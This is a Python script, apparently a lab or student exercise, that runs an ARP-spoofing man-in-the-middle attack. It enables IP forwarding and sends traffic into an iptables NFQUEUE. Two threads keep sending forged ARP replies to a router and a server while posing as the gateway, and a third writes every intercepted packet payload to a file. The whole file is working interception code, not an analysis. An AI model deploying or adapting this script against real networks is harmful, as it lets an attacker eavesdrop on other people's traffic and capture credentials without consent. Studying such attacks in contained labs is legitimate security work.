'''
Inspiration: https://www.thepythoncode.com/article/building-network-scanner-using-scapy
'''
import struct
from scapy.all import *
import os
import signal
import sys
import threading
import time
from netfilterqueue import NetfilterQueue as nfq


gateway_ip = "198.7.0.1"
packet_count = 1000

# restoring the rules after CTRL+C interrupt
def cleanup():
    print("Cleaning up iptables and disabling IP forwarding...")
    os.system("iptables -D FORWARD -j NFQUEUE --queue-num 5")
    os.system("iptables -D INPUT -j NFQUEUE --queue-num 5")
    os.system("iptables -D INPUT -p tcp --dport 22 -j ACCEPT")
    os.system("iptables -D FORWARD -p tcp --dport 22 -j ACCEPT")
    os.system("sysctl -w net.ipv4.ip_forward=0")
    print("Force quitting..")
    os._exit(0) # quick exit

# attaching to CTRL+C interrupt
signal.signal(signal.SIGINT, lambda sig, frame: cleanup())
signal.signal(signal.SIGTERM, lambda sig, frame: cleanup())

def init():
    # allow ssh before nfqueue rules
    os.system("iptables -I INPUT -p tcp --dport 22 -j ACCEPT")
    os.system("iptables -I FORWARD -p tcp --dport 22 -j ACCEPT")

    # turning ip forwarding on
    print("Enabling IP forwarding..")
    os.system("sysctl -w net.ipv4.ip_forward=1")
    print("IP forwarding enabled in queue 5")
    os.system("iptables -I FORWARD -j NFQUEUE --queue-num 5")
    print("Successfully enabled IP forwarding")
    os.system("iptables -I INPUT -j NFQUEUE --queue-num 5")

    # ARP = Address Resolution Protocol
    # MAC = Media Access Control
    # ARP Poison parameters

    # linux network interface for the attack
    # conf.iface = "eth0" # ethernet 0 interface
    conf.verb = 0 # detailing level

def get_mac_address(ip_address):
    # getting the MAC address from an ARP request
    # questioning the ip about its MAC address
    arp_request = ARP(pdst=ip_address) 
    
    # creating an Ether packet with an broadcast address(every device will revieve this packet)
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff") 
    
    # packing the requsest, resulting in a packet that will be sent as broadcast
    arp_request_broadcast = broadcast / arp_request
    
    print("Sending ARP request...")
    # srp = send and receive packets at layer 2, waiting for responses for 1s
    # returning the first packet
    response = srp(arp_request_broadcast, timeout=3, verbose = False)[0]
    
    print(f"Received {len(response)} responses")

    # check for the response
    if len(response) == 0:
        return None

    # getting the mac address
    mac = response[0][1].hwsrc

    print(f"MAC address found for ip {ip_address}: {mac}") # printing mac address
    
    return mac # returning mac address

def restore_network(gateway_ip, target_ip, target_mac):
    # healing the network
    send(ARP(op=2, hwdst="ff:ff:ff:ff:ff:ff", pdst=gateway_ip, hwsrc=target_mac, psrc=target_ip), count=5)

    # deleting the rules to restore the iptable
    os.system("iptables -D FORWARD -j NFQUEUE --queue-num 5")
    os.system("iptables -D INPUT -j NFQUEUE --queue-num 5")
    os.system("iptables -D INPUT -p tcp --dport 22 -j ACCEPT")
    os.system("iptables -D FORWARD -p tcp --dport 22 -j ACCEPT")

    print("Disabling IP forwarding..")
    os.system("sysctl -w net.ipv4.ip_forward=0")
    # killing the process on a mac
    os.kill(os.getpid(), signal.SIGTERM)

def arp_spoof(target_ip, target_mac, gateway_ip = gateway_ip):
    try:
        if target_mac == "":
            print(f"Finding target MAC for {target_ip}..")
            target_mac = get_mac_address(target_ip)
            if not target_mac:
                print(f"MAC not found for {target_ip}!")
                return
        while True:
            '''
            operation = {1: ARP Request, 2: ARP Reply} 
            protocol destination =  victim's ip
            hardware destination = victim's mac address, which will receieve the packet
            protocol source = ip that we pretend we have(spoof)
            '''
            send(ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip))
            time.sleep(2)
    except KeyboardInterrupt:
        print("ARP Spoofing ended by keyboard interruption!")

def save_packet(packet):
    # returning raw bytes of the packet
    payload = packet.get_payload()

    # converting into string
    packet_data = payload.decode("utf-8", errors="ignore")
    
    # create folder if it doesnt exist
    os.makedirs("sniffed_packets", exist_ok=True)

    # saving the data
    with open("sniffed_packets/captured_packets.txt", "a") as file:
        file.write(packet_data + "\n")
    
    packet.accept()

def sniff_packet():
    queue = nfq()
    try:
        # capturing packets from target_ip
        print("Packet sniffing started..")
        queue.bind(5, save_packet)
        queue.run()
    except KeyboardInterrupt:
        print("Packet sniffing ended..")
        queue.unbind()    

if __name__ == "__main__":
    print("Running..")

    # initializing data
    init()

    router_ip = "172.7.0.1"
    server_ip = "198.7.0.2"

    # using 2 threads for ARP Poisoning
    poison_router = threading.Thread(target=arp_spoof, 
                                    args=(router_ip, "", gateway_ip))
    poison_server = threading.Thread(target=arp_spoof, 
                                    args=(server_ip, "", gateway_ip))
    
    # sniffing packets in a different thread
    sniffing = threading.Thread(target=sniff_packet)

    try:
        poison_router.start()
        time.sleep(1)
        print("Router spoofing starting..")
    except:
        print("Router spoofing failed!")

    try:
        poison_server.start()
        time.sleep(1)
        print("Server spoofing starting..")
    except:
        print("Server spoofing failed!")

    try:
        sniffing.start()
        print("Sniffing packets..")
    except:
        print("Sniffing failed!")